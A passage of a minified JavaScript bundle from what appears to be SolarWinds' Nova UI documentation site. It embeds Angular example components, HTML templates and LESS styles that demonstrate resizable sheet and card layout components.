LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-layout-complex-example",\n    templateUrl: "./layout-complex.example.component.html",\n    styleUrls: ["./layout-complex.example.component.less"],\n})\nexport class LayoutComplexExampleComponent {}\n'},88595:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-message type="info" [allowDismiss]="false">\n    <strong>Note:</strong> As always, inline styles are not recommended. They\n    are only used in the examples on this page in an effort to make them more\n    easily digestible.\n</nui-message>\n<p>\n    <code>&lt;nui-sheet-group&gt;</code>, <code>&lt;nui-sheet&gt;</code>,\n    <code>&lt;nui-card-group&gt;</code>, <code>&lt;nui-card&gt;</code>, allow\n    you to build up a layout of different complexity.\n</p>\n<h2>Basic Usage</h2>\n<p>Basic example of sheet and card. Sheets must have at least one card.</p>\n<nui-example-wrapper filenamePrefix="layout-basic" exampleTitle="Basic Layout">\n    <nui-layout-basic-example></nui-layout-basic-example>\n</nui-example-wrapper>\n\n<h2>Page Content</h2>\n<p>\n    This example shows how easy it is to create a layout for the page content.\n</p>\n<nui-example-wrapper\n    filenamePrefix="layout-page-content"\n    exampleTitle="Page Content Example"\n>\n    <nui-layout-page-content-example></nui-layout-page-content-example>\n</nui-example-wrapper>\n\n<h2>Separate vs. Joined</h2>\n<p>\n    Use <code>&lt;nui-sheet-group&gt;</code> as a root element for your layout.\n    Inside <code>&lt;nui-sheet-group&gt;</code> go\n    <code>&lt;nui-sheet&gt;</code> elements which in turn take either\n    <code>&lt;nui-card-group&gt;</code> elements with\n    <code>&lt;nui-card&gt;</code>s or just <code>&lt;nui-card&gt;</code>s on\n    their own.\n</p>\n<p>\n    <code>&lt;nui-sheet-group&gt;</code> can be <code>separate</code> or\n    <code>joined</code>. Use input <code>sheetsType</code> to set this value. By\n    default, <code>sheetsType</code> is <code>joined</code>. All elements,\n    namely <code>&lt;nui-sheet-group&gt;</code>, <code>&lt;nui-sheet&gt;</code>,\n    <code>&lt;nui-card-group&gt;</code>,\n    <code>&lt;nui-card&gt;</code>\n    have <code>direction</code> input which can have a value of\n    <code>row</code> or <code>column</code>. Every element apart from\n    <code>&lt;nui-card&gt;</code> has <code>direction</code> input default value\n    of <code>row</code>. <code>&lt;nui-card&gt;</code> doesn\'t have a default\n    for <code>direction</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="layout-separate-sheets"\n    exampleTitle="Basic Separate Layout"\n>\n    <nui-layout-separate-sheets-example></nui-layout-separate-sheets-example>\n</nui-example-wrapper>\n\n<h2>Fit Content</h2>\n<p>\n    Besides <code>direction</code> input, <code>&lt;nui-sheet&gt;</code> has\n    also a boolean input <code>fitContent</code>. When set to <code>true</code>,\n    <code>fitContent</code> makes it such that <code>&lt;nui-sheet&gt;</code>\'s\n    width is the same as its children\'s one.\n</p>\n<p>\n    Also, <code>&lt;nui-sheet&gt;</code> and\n    <code>&lt;nui-card-group&gt;</code> are both scrollable.\n</p>\n<nui-example-wrapper\n    filenamePrefix="layout-fit-content"\n    exampleTitle="Fit Content"\n>\n    <nui-layout-fit-content></nui-layout-fit-content>\n</nui-example-wrapper>\n\n<h2>Enabling Resize</h2>\n<p>\n    To make <code>&lt;nui-sheet-group&gt;</code> resizable you should set to\n    <code>true</code> a boolean input <code>isResizable</code>. You can also\n    configure a resize value of <code>&lt;nui-sheet-group&gt;</code>\'s child\n    elements by passing <code>"%"</code> or <code>"px"</code> to\n    <code>resizeUnit</code> input. By default pixels are used.\n</p>\n<nui-example-wrapper\n    filenamePrefix="layout-resize"\n    exampleTitle="Resizable Layout"\n>\n    <nui-layout-resize-example></nui-layout-resize-example>\n</nui-example-wrapper>\n\n<h2>Passing Initial Size</h2>\n<p>\n    <code>&lt;nui-sheet-group&gt;</code> and <code>&lt;nui-sheet&gt;</code> can\n    be passed an initial size. Use input <code>initialSizeValue</code> to set\n    this value. NOTE: setting initial size does not work with\n    <code>fitContent</code> property. Pay attention to the\n    <code>resizeUnit</code> of <code>&lt;nui-sheet-group&gt;</code>. Pass an\n    appropriate value in <code>"%"</code> or <code>"px"</code> to\n    <code>&lt;nui-sheet-group&gt;</code> and <code>&lt;nui-sheet&gt;</code>.\n    This will tell components what unit to use (pixels or percents), when trying\n    to resize your layout.\n</p>\n<nui-example-wrapper\n    filenamePrefix="layout-init-size"\n    exampleTitle="Initial Size"\n>\n    <nui-layout-init-size-example></nui-layout-init-size-example>\n</nui-example-wrapper>\n\n<h2>Complex Example</h2>\n\n<nui-example-wrapper\n    filenamePrefix="layout-complex"\n    exampleTitle="Complex Example"\n>\n    <nui-layout-complex-example></nui-layout-complex-example>\n</nui-example-wrapper>\n'},37739:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-layout-docs-example",\n    templateUrl: "./layout-docs.example.component.html",\n})\nexport class LayoutExampleComponent {}\n'},66733:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-demo-custom-container">\n    <nui-sheet-group direction="row">\n        <nui-sheet direction="column" [fitContent]="true">\n            <nui-card-group>\n                <nui-card direction="row">\n                    <div\n                        class="nui-demo-nui-card__block-element--min-width nui-demo-nui-card__block-element--max-width-regular nui-demo-nui-card__block-element--exact-width nui-demo-nui-card__block-element"\n                        i18n\n                    >\n                        HAS MAX AND MIN WIDTH, SPECIFIC WIDTH IS SET, CARD\n                        DIRECTION IS ROW\n                    </div>\n                </nui-card>\n                <nui-card>\n                    <div\n                        class="nui-demo-nui-card__block-element--min-width nui-demo-nui-card__block-element--max-width-small nui-demo-nui-card__block-element--exact-width exactHeight nui-demo-nui-card__block-element"\n                        i18n\n                    >\n                        HAS MAX AND MIN WIDTH, SPECIFIC WIDTH IS SET, CARD\n                        DIRECTION UNSPECIFIED\n                    </div>\n                </nui-card>\n            </nui-card-group>\n        </nui-sheet>\n        <nui-sheet direction="column">\n            <nui-card-group direction="column">\n                <nui-card\n                    ><div\n                        class="nui-demo-nui-card__block-element--width-stretch nui-demo-nui-card__block-element--height-regular"\n                    ></div\n                ></nui-card>\n                <nui-card\n                    ><div\n                        class="nui-demo-nui-card__block-element--width-stretch nui-demo-nui-card__block-element--height-large"\n                    ></div\n                ></nui-card>\n                <nui-card\n                    ><div\n                        class="nui-demo-nui-card__block-element--width-stretch nui-demo-nui-card__block-element--height-small"\n                    ></div\n                ></nui-card>\n                <nui-card\n                    ><div\n                        class="nui-demo-nui-card__block-element--width-stretch nui-demo-nui-card__block-element--height-small"\n                    ></div\n                ></nui-card>\n                <nui-card\n                    ><div\n                        class="nui-demo-nui-card__block-element--width-stretch nui-demo-nui-card__block-element--height-small"\n                    ></div\n                ></nui-card>\n            </nui-card-group>\n        </nui-sheet>\n    </nui-sheet-group>\n</div>\n'},55169:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n.nui-demo-nui-card__block-element {\n    .setCssVariable(background-color, nui-color-semantic-critical-bg);\n}\n.nui-demo-nui-card__block-element--min-width {\n    min-width: 100px;\n}\n.nui-demo-nui-card__block-element--max-width-small {\n    max-width: 150px;\n}\n.nui-demo-nui-card__block-element--max-width-regular {\n    max-width: 200px;\n}\n.nui-demo-nui-card__block-element--exact-width {\n    width: 150px;\n}\n.nui-demo-nui-card__block-element--exact-height {\n    height: 300px;\n}\n.nui-demo-nui-card__block-element--width-stretch {\n    width: 100%;\n    .setCssVariable(background-color, nui-color-semantic-critical-bg);\n}\n.nui-demo-nui-card__block-element--height-small {\n    height: 110px;\n}\n.nui-demo-nui-card__block-element--height-regular {\n    height: 130px;\n}\n.nui-demo-nui-card__block-element--height-large {\n    height: 230px;\n}\n.nui-demo-custom-container {\n    height: 750px;\n    width: 100%;\n}\n'},44633:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-layout-fit-content",\n    templateUrl: "./layout-fit-content.example.component.html",\n    styleUrls: ["./layout-fit-content.example.component.less"],\n})\nexport class LayoutFitContentComponent {}\n'},58235:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-sheet-group\n    sheetsType="joined"\n    direction="row"\n    [isResizable]="true"\n    resizeUnit="%"\n    style="height: 710px"\n>\n    <nui-sheet-group\n        id="nui-demo-sheet-group--outer"\n        sheetsType="joined"\n        direction="column"\n        [isResizable]="true"\n    >\n        <nui-sheet-group sheetsType="joined">\n            <nui-sheet>\n                <nui-card> </nui-card>\n            </nui-sheet>\n        </nui-sheet-group>\n        <nui-sheet-group\n            resizeUnit="%"\n            initialSizeValue="215px"\n            id="nui-demo-sheet-group--inner"\n            [isResizable]="true"\n            sheetsType="joined"\n        >\n            <nui-sheet>\n                <nui-card> </nui-card>\n            </nui-sheet>\n            <nui-sheet id="nui-demo-sheet-group__sheet">\n                <nui-card> </nui-card>\n            </nui-sheet>\n            <nui-sheet initialSizeValue="50%">\n                <nui-card> </nui-card>\n            </nui-sheet>\n        </nui-sheet-group>\n    </nui-sheet-group>\n    <nui-sheet-group\n        sheetsType="joined"\n        direction="column"\n        [isResizable]="true"\n        resizeUnit="%"\n    >\n        <nui-sheet class="pt-2">\n            <nui-card> </nui-card>\n        </nui-sheet>\n        <nui-sheet class="pt-2">\n            <nui-card> </nui-card>\n        </nui-sheet>\n        <nui-sheet class="pt-2">\n            <nui-card> </nui-card>\n        </nui-sheet>\n    </nui-sheet-group>\n</nui-sheet-group>\n'},30019:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-layout-init-size-example",\n    templateUrl: "./layout-init-size.component.html",\n})\nexport class LayoutInitSizeExampleComponent {}\n'},45843:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-flex flex-column nui-demo-workspace">\n    <div class="nui-demo-workspace__header flex-row">\n        <h1>Page Title</h1>\n    </div>\n    <nui-sheet-group class="flex-fill">\n        <nui-sheet>\n            <nui-card> </nui-card>\n        </nui-sheet>\n    </nui-sheet-group>\n</div>\n'},53163:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-layout-page-content-example",\n    templateUrl: "./layout-page-content.example.component.html",\n    styleUrls: ["./layout-page-content.example.less"],\n})\nexport class LayoutPageContentExampleComponent {}\n'},58062:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference) "nui-framework-palette";\n@import (reference) "mixins";\n.nui-demo-workspace {\n    padding: @nui-space-md;\n    .setCssVariable(background-color, nui-color-bg-secondary);\n    height: 200px; // This is for demo purpose. in real world it will be something like 100%\n\n    &__header {\n        h1 {\n            margin: @nui-space-sm 0;\n        }\n    }\n}\n'},18215:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-sheet-group\n    sheetsType="separate"\n    direction="row"\n    [isResizable]="true"\n    resizeUnit="px"\n    style="height: 500px"\n>\n    <nui-sheet-group\n        sheetsType="separate"\n        direction="column"\n        [isResizable]="true"\n        resizeUnit="%"\n    >\n        <nui-sheet-group sheetsType="separate">\n            <nui-sheet>\n                <nui-card>\n                    <div class="nui-demo-nui-card__block-element"></div>\n                </nui-card>\n            </nui-sheet>\n        </nui-sheet-group>\n        <nui-sheet-group\n            [isResizable]="true"\n            sheetsType="separate"\n            resizeUnit="%"\n        >\n            <nui-sheet>\n                <nui-card>\n                    <div class="nui-demo-nui-card__block-element"></div>\n                </nui-card>\n            </nui-sheet>\n            <nui-sheet>\n                <nui-card>\n                    <div class="nui-demo-nui-card__block-element"></div>\n                </nui-card>\n            </nui-sheet>\n            <nui-sheet>\n                <nui-card>\n                    <div class="nui-demo-nui-card__block-element"></div>\n                </nui-card>\n            </nui-sheet>\n        </nui-sheet-group>\n    </nui-sheet-group>\n    <nui-sheet-group\n        sheetsType="separate"\n        direction="column"\n        [isResizable]="true"\n        resizeUnit="%"\n    >\n        <nui-sheet>\n            <nui-card>\n                <div class="nui-demo-nui-card__block-element"></div>\n            </nui-card>\n        </nui-sheet>\n        <nui-sheet>\n            <nui-card>\n                <div class="nui-demo-nui-card__block-element"></div>\n            </nui-card>\n        </nui-sheet>\n        <nui-sheet>\n            <nui-card>\n                <div class="nui-demo-nui-card__block-element"></div>\n            </nui-card>\n        </nui-sheet>\n    </nui-sheet-group>\n</nui-sheet-group>\n'},41171:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".nui-demo-nui-card__block-element {\n    width: 100%;\n    height: 100%;\n    min-width: 10px;\n    min-height: 10px;\n}\n"},44735:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-layout-resize-example",\n    templateUrl: "./layout-resize.example.component.html",\n    styleUrls: ["./layout-resize.example.component.less"],\n})\nexport class LayoutResizeExampleComponent {}\n'},49143:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-sheet-group sheetsType="separate">\n    <nui-sheet-group sheetsType="joined" direction="column">\n        <nui-sheet direction="row">\n            <nui-card direction="row">\n                <div class="nui-demo-nui-card__block-element"></div>\n            </nui-card>\n        </nui-sheet>\n        <nui-sheet direction="row">\n            <nui-card>\n                <div class="nui-demo-nui-card__block-element"></div>\n            </nui-card>\n        </nui-sheet>\n    </nui-sheet-group>\n    <nui-sheet-group sheetsType="separate" direction="column">\n        <nui-sheet direction="row">\n            <nui-card direction="column">\n                <div class="nui-demo-nui-card__block-element"></div>\n            </nui-card>\n        </nui-sheet>\n        <nui-sheet direction="row">\n            <nui-card direction="column">\n                <div class="nui-demo-nui-card__block-element"></div>\n            </nui-card>\n        </nui-sheet>\n    </nui-sheet-group>\n</nui-sheet-group>\n'},65795:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".nui-demo-nui-card__block-element {\n    width: 100%;\n    height: 100%;\n}\n"},76943:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-layout-separate-sheets-example",\n    templateUrl: "./layout-separate-sheets.example.component.html",\n    styleUrls: ["./layout-separate-sheets.example.component.less"],\n})\nexport class LayoutSeparateSheetsExampleComponent {}\n'},50416:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-sheet-group\n    sheetsType="joined"\n    direction="row"\n    [isResizable]="true"\n    resizeUnit="px"\n    style="height: 500px"\n>\n    <nui-sheet-group\n        id="nui-demo-sheet-group--outer"\n        sheetsType="joined"\n        direction="column"\n        [isResizable]="true"\n        resizeUnit="%"\n    >\n        <nui-sheet-group sheetsType="joined">\n            <nui-sheet>\n                <nui-card> </nui-card>\n            </nui-sheet>\n        </nui-sheet-group>\n        <nui-sheet-group\n            id="nui-demo-sheet-group--inner"\n            [isResizable]="true"\n            sheetsType="joined"\n            resizeUnit="%"\n        >\n            <nui-sheet>\n                <nui-card> </nui-card>\n            </nui-sheet>\n            <nui-sheet id="nui-demo-sheet-group__sheet">\n                <nui-card> </nui-card>\n            </nui-sheet>\n            <nui-sheet>\n                <nui-card> </nui-card>\n            </nui-sheet>\n        </nui-sheet-group>\n    </nui-sheet-group>\n    <nui-sheet-group\n        sheetsType="joined"\n        direction="column"\n        [isResizable]="true"\n        resizeUnit="%"\n    >\n        <nui-sheet class="pt-2">\n            <nui-card> </nui-card>\n        </nui-sheet>\n        <nui-sheet class="pt-2">\n            <nui-card> </nui-card>\n        </nui-sheet>\n        <nui-sheet class="pt-2">\n            <nui-card> </nui-card>\n        </nui-sheet>\n    </nui-sheet-group>\n</nui-sheet-group>\n'},28635:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-layout-test",\n    templateUrl: "./layout-test.component.html",\n})\nexport class LayoutTestComponent {}\n'},5161:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row">\n        <div class="col" style="height: 150px">\n            <h3>Joined Sheet Group with Sheet Cards</h3>\n            <nui-sheet-group sheetsType="joined">\n                <nui-sheet style="height: 150px">\n                    <nui-card-group>\n                        <nui-card> </nui-card>\n                    </nui-card-group>\n                </nui-sheet>\n                <nui-sheet style="height: 150px">\n                    <nui-card-group>\n                        <nui-card> </nui-card>\n                    </nui-card-group>\n                </nui-sheet>\n                <nui-sheet style="height: 150px">\n                    <nui-card-group>\n                        <nui-card> </nui-card>\n                    </nui-card-group>\n                </nui-sheet>\n                <nui-sheet style="height: 150px">\n                    <nui-card-group>\n                        <nui-card> </nui-card>\n                    </nui-card-group>\n                </nui-sheet>\n            </nui-sheet-group>\n        </div>\n        <div class="col">\n            <h3>Joined Sheet Group with Sheet Cards</h3>\n            <nui-sheet-group sheetsType="separate">\n                <nui-sheet style="height: 150px">\n                    <nui-card-group>\n                        <nui-card> </nui-card>\n                    </nui-card-group>\n                </nui-sheet>\n                <nui-sheet style="height: 150px">\n                    <nui-card-group>\n                        <nui-card> </nui-card>\n                    </nui-card-group>\n                </nui-sheet>\n                <nui-sheet style="height: 150px">\n                    <nui-card-group>\n                        <nui-card> </nui-card>\n                    </nui-card-group>\n                </nui-sheet>\n                <nui-sheet style="height: 150px">\n                    <nui-card-group>\n                        <nui-card> </nui-card>\n                    </nui-card-group>\n                </nui-sheet>\n            </nui-sheet-group>\n        </div>\n    </div>\n    <div>\n        <h3>Complex Example</h3>\n        <nui-sheet-group\n            sheetsType="separate"\n            direction="row"\n            [isResizable]="true"\n            resizeUnit="px"\n            style="height: 500px"\n            id="nui-visual-test-layout-separated-sheet-group"\n        >\n            <nui-sheet-group\n                sheetsType="separate"\n                direction="column"\n                [isResizable]="true"\n                resizeUnit="%"\n            >\n                <nui-sheet-group sheetsType="separate">\n                    <nui-sheet>\n                        <nui-card-group>\n                            <nui-card> </nui-card>\n                        </nui-card-group>\n                    </nui-sheet>\n                </nui-sheet-group>\n                <nui-sheet-group\n                    [isResizable]="true"\n                    sheetsType="separate"\n                    resizeUnit="%"\n                >\n                    <nui-sheet>\n                        <nui-card-group>\n                            <nui-card> </nui-card>\n                        </nui-card-group>\n                    </nui-sheet>\n                    <nui-sheet>\n                        <nui-card-group>\n                            <nui-card> </nui-card>\n                        </nui-card-group>\n                    </nui-sheet>\n                    <nui-sheet>\n                        <nui-card-group>\n                            <nui-card> </nui-card>\n                        </nui-card-group>\n                    </nui-sheet>\n                </nui-sheet-group>\n            </nui-sheet-group>\n            <nui-sheet-group\n                sheetsType="joined"\n                direction="column"\n                [isResizable]="true"\n                resizeUnit="%"\n                id="nui-visual-test-layout-joined-sheet-group"\n            >\n                <nui-sheet-group\n                    sheetsType="joined"\n                    direction="row"\n                    [isResizable]="true"\n                    resizeUnit="px"\n                    style="height: 500px"\n                >\n                    <nui-sheet-group\n                        sheetsType="joined"\n                        direction="column"\n                        [isResizable]="true"\n                        resizeUnit="%"\n                    >\n                        <nui-sheet-group sheetsType="joined">\n                            <nui-sheet>\n                                <nui-card> </nui-card>\n                            </nui-sheet>\n                        </nui-sheet-group>\n                        <nui-sheet-group\n                            [isResizable]="true"\n                            sheetsType="joined"\n                            resizeUnit="%"\n                        >\n                            <nui-sheet>\n                                <nui-card> </nui-card>\n                            </nui-sheet>\n                            <nui-sheet>\n                                <nui-card> </nui-card>\n                            </nui-sheet>\n                            <nui-sheet>\n                                <nui-card> </nui-card>\n                            </nui-sheet>\n                        </nui-sheet-group>\n                    </nui-sheet-group>\n                    <nui-sheet-group\n                        sheetsType="joined"\n                        direction="column"\n                        [isResizable]="true"\n                        resizeUnit="%"\n                    >\n                        <nui-sheet class="pt-2">\n                            <nui-card> </nui-card>\n                        </nui-sheet>\n                        <nui-sheet class="pt-2">\n                            <nui-card> </nui-card>\n                        </nui-sheet>\n                        <nui-sheet class="pt-2">\n                            <nui-card> </nui-card>\n                        </nui-sheet>\n                    </nui-sheet-group>\n                </nui-sheet-group>\n            </nui-sheet-group>\n        </nui-sheet-group>\n    </div>\n    <div>\n        <h3>Fit Content</h3>\n        <div style="height: 300px">\n            <nui-sheet-group direction="row">\n                <nui-sheet direction="column" [fitContent]="true">\n                    <nui-card-group>\n                        <nui-card style="min-width: 200px" direction="row">\n                        </nui-card>\n                        <nui-card style="min-width: 200px" direction="row">\n                        </nui-card>\n                    </nui-card-group>\n                </nui-sheet>\n                <nui-sheet direction="column">\n                    <nui-card-group direction="column">\n                        <nui-card style="min-height: 100px"> </nui-card>\n                        <nui-card style="min-height: 100px"> </nui-card>\n                        <nui-card style="min-height: 100px"> </nui-card>\n                        <nui-card style="min-height: 100px"> </nui-card>\n                        <nui-card style="min-height: 100px"> </nui-card>\n                        <nui-card style="min-height: 100px"> </nui-card>\n                    </nui-card-group>\n                </nui-sheet>\n            </nui-sheet-group>\n        </div>\n    </div>\n</div>\n'},98661:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be 